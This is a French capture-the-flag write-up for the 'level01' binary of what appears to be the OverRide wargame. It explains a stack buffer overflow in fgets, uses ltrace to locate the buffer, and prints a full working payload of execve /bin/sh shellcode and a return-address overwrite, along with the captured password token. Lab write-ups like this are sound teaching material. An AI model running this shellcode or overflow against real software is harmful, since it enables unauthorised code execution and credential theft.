# Level 01

L'username et le mot de passe sont triviaux à trouver dans la section .rodata: `dat_wil` et `admin`

On peut overflow fgets qui écrit 100 caractère dans un buffer de taille 76.

Il nous suffit donc de mettre un shellcode dans le buffer et set l'adresse de retour du main au début du buffer.

Trouvons l'adresse du buffer dans un premier temps avec ltrace:

```bash
level01@OverRide:~$ ltrace ./level01 
__libc_start_main(0x80484d0, 1, -10524, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)                                                              = 39
printf("Enter Username: ")                                                                               = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)                                                                      = 0x0804a040
puts("verifying username....\n"verifying username....

)                                                                         = 24
puts("Enter Password: "Enter Password: 
)                                                                                 = 17
fgets(admin
"admin\n", 100, 0xf7fcfac0)                                                                        = 0xffffd5fc
puts("nope, incorrect password...\n"nope, incorrect password...

)                                                                    = 29
```

L'adresse du buffer est donc: 0xffffd5fc

On peut donc obtenir le token avec cette commande:

```bash
level01@OverRide:~$ (echo "dat_wil"; python -c 'print "\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x0B\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xCD\x80" + "A"*55 + "\xff\xff\xd5\xfc"[::-1] '; echo "cat /home/users/level02/.pass") | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```